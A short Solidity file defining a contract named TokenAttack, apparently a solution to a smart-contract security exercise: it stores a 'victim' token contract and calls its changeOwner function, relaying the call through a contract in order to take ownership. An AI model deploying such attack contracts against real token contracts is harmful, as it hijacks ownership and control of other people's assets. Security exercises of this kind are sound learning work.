// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Token.sol";

contract TokenAttack {
    Token public victimcontract;
    
    

    constructor(address _victimContractAddress) public {
        victimcontract = Token(_victimContractAddress);
    }

    function FTF(address _owner) public {
       victimcontract.changeOwner(_owner);
    }
}